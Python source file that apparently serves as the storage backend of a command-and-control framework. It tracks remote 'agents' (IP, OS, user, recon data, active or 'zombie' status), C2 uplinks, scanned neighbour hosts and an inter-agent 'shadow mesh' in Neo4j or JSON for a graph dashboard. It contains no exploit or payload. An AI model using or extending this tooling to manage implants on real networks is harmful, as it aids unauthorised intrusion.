import json
import os
import time
from datetime import datetime
from threading import Lock
from neo4j import GraphDatabase
from .logger import logger


class SovereignDB:
    """
    Sovereign Persistence Layer.
    Implements a Hybrid Graph structure (Neo4j Primary -> JSON Fallback).
    """

    def __init__(self, storage_path="persistence/graph.json"):
        self.storage_path = storage_path
        self.lock = Lock()
        self.db = {
            "agents": {},  # {agent_id: {data}}
            "zombies": {},  # {agent_id: {history}}
            "nodes": {},  # {node_id: {data}} - Network nodes
            "links": [],  # List of {source, target, type}
            "achievements": {},  # {achievement_id: timestamp}
            "agents_mesh": [],  # New: Shadow Mesh (P2P inter-agent links)
        }
        
        # NEO4J CONFIGURATION
        self.neo4j_uri = os.getenv("NEO4J_URI", "")
        self.neo4j_user = os.getenv("NEO4J_USER", "neo4j")
        self.neo4j_password = os.getenv("NEO4J_PASSWORD", "")
        self.driver = None
        self.use_neo4j = False

        self._ensure_storage()
        self._load()
        self._connect_neo4j()

    def _ensure_storage(self):
        directory = os.path.dirname(self.storage_path)
        if not os.path.exists(directory):
            os.makedirs(directory)

    def _load(self):
        if os.path.exists(self.storage_path):
            try:
                with open(self.storage_path, "r") as f:
                    self.db = json.load(f)
            except Exception as e:
                logger.error(f"[!] DB Load Error: {e}")

    def _save(self):
        with open(self.storage_path, "w") as f:
            json.dump(self.db, f, indent=4)

    def _connect_neo4j(self):
        if self.neo4j_uri and self.neo4j_password:
            try:
                self.driver = GraphDatabase.driver(
                    self.neo4j_uri, auth=(self.neo4j_user, self.neo4j_password)
                )
                self.driver.verify_connectivity()
                self.use_neo4j = True
                logger.info("[+] NEO4J CONNECTED: Shadow Graph Online")
            except Exception as e:
                logger.warning(f"[-] NEO4J CONNECTION FAILED: {e} (Using JSON Fallback)")
                self.use_neo4j = False
        else:
            logger.info("[*] NEO4J Not Configured: Using Local JSON Fallback")

    def upsert_agent(self, agent_id, data):
        with self.lock:
            # Update Active Agent (JSON)
            data["last_seen"] = datetime.now().isoformat()
            self.db["agents"][agent_id] = data

            # Ensure C2 Link (JSON)
            if not self._link_exists("SHADOW_RELAY", f"agent_{agent_id}"):
                self.db["links"].append(
                    {
                        "source": "SHADOW_RELAY",
                        "target": f"agent_{agent_id}",
                        "type": "C2",
                    }
                )
            self._save()

        # Update Neo4j (Async/Best Effort)
        if self.use_neo4j:
            try:
                query = """
                MERGE (a:Agent {id: $id})
                SET a.ip = $ip, a.os = $os, a.user = $user, a.last_seen = $last_seen, a.status = $status
                MERGE (c2:C2 {id: 'SHADOW_RELAY'})
                MERGE (c2)-[:C2_UPLINK]->(a)
                """
                with self.driver.session() as session:
                    session.run(query, **data)
            except Exception as e:
                logger.error(f"[!] Neo4j Sync Error: {e}")

    def add_shadow_link(self, source_aid: str, target_aid: str):
        with self.lock:
            if "agents_mesh" not in self.db:
                self.db["agents_mesh"] = []

            # Check for duplicate
            for link in self.db["agents_mesh"]:
                if link["source"] == source_aid and link["target"] == target_aid:
                    return

            self.db["agents_mesh"].append({"source": source_aid, "target": target_aid})
            self._save()
        
        # Neo4j Sync
        if self.use_neo4j:
            try:
                query = """
                MATCH (a:Agent {id: $src}), (b:Agent {id: $tgt})
                MERGE (a)-[:SHADOW_MESH]->(b)
                """
                with self.driver.session() as session:
                    session.run(query, src=source_aid, tgt=target_aid)
            except Exception as e:
                pass

    def add_network_relation(self, agent_id, neighbors):
        with self.lock:
            source_id = f"agent_{agent_id}"
            for neighbor in neighbors:
                target_ip = neighbor.get("ip")
                target_id = f"neighbor_{target_ip}"

                # Add Node (JSON)
                self.db["nodes"][target_id] = {
                    "ip": target_ip,
                    "mac": neighbor.get("mac"),
                    "type": "node",
                    "last_seen": datetime.now().isoformat(),
                }

                # Add Link (JSON)
                if not self._link_exists(source_id, target_id):
                    self.db["links"].append(
                        {"source": source_id, "target": target_id, "type": "SCAN"}
                    )
            self._save()

        # Neo4j Sync
        if self.use_neo4j:
            try:
                for neighbor in neighbors:
                    query = """
                    MATCH (a:Agent {id: $aid})
                    MERGE (n:Node {ip: $ip})
                    SET n.mac = $mac, n.last_seen = $last_seen
                    MERGE (a)-[:SCANNED]->(n)
                    """
                    params = {
                        "aid": agent_id,
                        "ip": neighbor.get("ip"),
                        "mac": neighbor.get("mac"),
                        "last_seen": datetime.now().isoformat()
                    }
                    with self.driver.session() as session:
                        session.run(query, **params)
            except Exception as e:
                logger.error(f"[!] Neo4j Topology Sync Error: {e}")

    def _link_exists(self, src, target):
        for link in self.db["links"]:
            if link["source"] == src and link["target"] == target:
                return True
        return False

    def get_graph(self):
        # Fallback to JSON for now to ensure UI consistency
        # In full production, we'd query Neo4j and transform to this D3.js format
        # but for hybrid stability, we serve the in-memory cache we maintain.
        
        nodes = []
        links = list(self.db["links"])  # Create a mutable copy to add new links
        now = datetime.now()

        # 1. Neural Core [C2]
        nodes.append(
            {
                "id": "SHADOW_RELAY",
                "name": "Neural Core [C2]",
                "val": 25,
                "group": 1,
                "color": "#ff003c",
            }
        )

        # 2. Agents (Active vs Zombie)
        for aid, data in self.db["agents"].items():
            last_seen = datetime.fromisoformat(data["last_seen"])
            delta_seconds = (now - last_seen).total_seconds()

            is_active = delta_seconds < 60  # 1 minute threshold
            color = "#00ff41" if is_active else "#666666"
            group = 3 if is_active else 2  # Active: 3 (Green), Zombie: 2 (Purple)
            name_prefix = "GHOST" if is_active else "ZOMBIE"

            nodes.append(
                {
                    "id": f"agent_{aid}",
                    "name": f"{name_prefix}_{aid[:4]}",
                    "val": 18,
                    "group": group,
                    "color": color,
                    "info": data.get("recon", {}),
                }
            )

        # 3. Discovered Network Nodes
        for nid, data in self.db["nodes"].items():
            nodes.append(
                {
                    "id": nid,
                    "name": f"NODE_{data['ip']}",
                    "val": 10,
                    "group": 4,
                    "color": "#00f3ff",
                }
            )

        # 4. Shadow Mesh (Inter-Agent Links)
        for slink in self.db.get("agents_mesh", []):
            links.append(
                {
                    "source": f"agent_{slink['source']}",
                    "target": f"agent_{slink['target']}",
                    "is_shadow": True,
                    "color": "#444444",
                }
            )

        return {"nodes": nodes, "links": links}

    def get_agents(self):
        return self.db["agents"]


# Singleton instance
sovereign_db = SovereignDB()
